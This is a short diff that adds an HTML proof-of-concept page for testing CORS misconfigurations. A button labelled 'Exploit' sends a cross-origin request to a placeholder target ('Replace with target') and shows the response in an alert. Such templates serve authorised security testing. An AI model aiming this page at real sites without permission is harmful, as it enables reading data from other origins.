@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+   <script>
+    function cors() {
+     var req = new XMLHttpRequest();
+     req.onload = reqListener;
+     req.open('get','https://example.com',true); //Replace with target
+     req.withCredentials = false;
+     req.send('{}');
+      function reqListener() {
+       alert(this.responseText);
+      }
+     }
+   </script>
+  </head>
+  <body>
+   <center>
+    <h2>CORS PoC</h2>
+    <h3>Click for page content</h3>
+     <div id="testButton">
+      <button type="button" onclick="cors()">Exploit</button>
+     </div>
+   </center>  
+  </body>
+</html>
